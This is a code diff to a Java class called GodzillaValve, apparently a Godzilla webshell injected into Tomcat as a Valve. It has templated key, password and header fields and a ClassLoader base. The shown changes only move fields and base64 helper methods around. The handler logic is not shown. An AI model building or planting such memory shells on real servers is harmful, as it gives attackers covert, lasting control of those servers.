@@ -15,19 +15,57 @@ import java.io.IOException;
  * @author ReaJason
  */
 public class GodzillaValve extends ClassLoader implements Valve {
-    protected Valve next;
-    protected boolean asyncSupported;
     public String key = "{{key}}";
     public String pass = "{{pass}}";
     public String md5 = "{{md5}}";
     public String headerName = "{{headerName}}";
     public String headerValue = "{{headerValue}}";
+    protected Valve next;
+    protected boolean asyncSupported;
 
     public GodzillaValve() {
     }
 
     public GodzillaValve(ClassLoader z) {
         super(z);
+    }
+
+    @SuppressWarnings("all")
+    public static String base64Encode(byte[] bs) {
+        String value = null;
+        Class base64;
+        try {
+            base64 = Class.forName("java.util.Base64");
+            Object Encoder = base64.getMethod("getEncoder", (Class[]) null).invoke(base64, (Object[]) null);
+            value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, bs);
+        } catch (Exception var6) {
+            try {
+                base64 = Class.forName("sun.misc.BASE64Encoder");
+                Object Encoder = base64.newInstance();
+                value = (String) Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, bs);
+            } catch (Exception var5) {
+            }
+        }
+        return value;
+    }
+
+    @SuppressWarnings("all")
+    public static byte[] base64Decode(String bs) {
+        byte[] value = null;
+        Class base64;
+        try {
+            base64 = Class.forName("java.util.Base64");
+            Object decoder = base64.getMethod("getDecoder", (Class[]) null).invoke(base64, (Object[]) null);
+            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
+        } catch (Exception var6) {
+            try {
+                base64 = Class.forName("sun.misc.BASE64Decoder");
+                Object decoder = base64.newInstance();
+                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
+            } catch (Exception var5) {
+            }
+        }
+        return value;
     }
 
     @SuppressWarnings("all")
@@ -95,43 +133,5 @@ public class GodzillaValve extends ClassLoader implements Valve {
             this.getNext().invoke(request, response);
         }
 
-    }
-
-    @SuppressWarnings("all")
-    public static String base64Encode(byte[] bs) {
-        String value = null;
-        Class base64;
-        try {
-            base64 = Class.forName("java.util.Base64");
-            Object Encoder = base64.getMethod("getEncoder", (Class[]) null).invoke(base64, (Object[]) null);
-            value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, bs);
-        } catch (Exception var6) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Encoder");
-                Object Encoder = base64.newInstance();
-                value = (String) Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, bs);
-            } catch (Exception var5) {
-            }
-        }
-        return value;
-    }
-
-    @SuppressWarnings("all")
-    public static byte[] base64Decode(String bs) {
-        byte[] value = null;
-        Class base64;
-        try {
-            base64 = Class.forName("java.util.Base64");
-            Object decoder = base64.getMethod("getDecoder", (Class[]) null).invoke(base64, (Object[]) null);
-            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
-        } catch (Exception var6) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Decoder");
-                Object decoder = base64.newInstance();
-                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
-            } catch (Exception var5) {
-            }
-        }
-        return value;
     }
 }
